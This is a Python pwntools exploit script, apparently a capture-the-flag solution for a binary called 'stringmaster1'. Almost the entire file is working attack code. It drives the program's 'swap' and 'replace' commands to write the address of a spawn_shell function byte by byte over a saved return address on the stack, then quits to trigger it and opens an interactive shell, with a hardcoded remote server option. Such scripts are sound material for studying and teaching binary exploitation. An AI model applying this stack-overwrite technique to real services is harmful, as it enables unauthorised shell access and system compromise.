from pwn import *
import argparse
import os
import string

#context.log_level = "debug"
LOCAL_PATH = "./stringmaster1"

def get_process(is_remote = False):
    if is_remote:
        return remote("35.207.132.47", 22224)
    else:
        return process(LOCAL_PATH)

def read_menu(proc):
    proc.recvuntil("\n> ")

def swap(proc, index1, index2):
    read_menu(proc)
    proc.sendline("swap")
    proc.sendline("{} {}".format(index1, index2))
    log.info("Swapping index {} and {}".format(index1, index2))

def replace(proc, char1, char2):
    read_menu(proc)
    proc.sendline("replace")
    proc.sendline("{} {}".format(char1, char2))
    log.info("Replacing '{}' and '{}'".format(char1, char2))

def print_info(proc):
    read_menu(proc)
    proc.sendline("print")
    return proc.recvuntil("\nEnter the command you want to execute:", drop = True)

def quit(proc):
    read_menu(proc)
    proc.sendline("quit")
    log.info("Quitting...")

parser = argparse.ArgumentParser()
parser.add_argument("-r", "--remote", help="Execute on remote server", action="store_true")
args = parser.parse_args()

e = ELF(LOCAL_PATH)

p = get_process(args.remote)
p.recvuntil("String1: ")
str1 = p.recvline()
p.recvuntil("String2: ")
str2 = p.recvline()

log.info("String 1: {}".format(str1))
log.info("String 2: {}".format(str2))
for x in string.ascii_lowercase:
    if x not in str1:
        missing_letter = x
        break
replace(p, x, x)

# 0x40246d (ret) -> 0x4011A7 (shell)

spawn_shell_addr = e.symbols["_Z11spawn_shellv"]
log.info("Address of spawn_shell: {}".format(hex(spawn_shell_addr)))

print "Before modification:"
print hexdump(print_info(p))

base_index = 0x88
for i, char in enumerate(p64(spawn_shell_addr)):
    replace(p, str1[0], char)
    swap(p, 0, base_index + i)
    str1 = print_info(p)[:len(str1)]

print "After modification:"
print hexdump(print_info(p))
quit(p)
p.interactive()

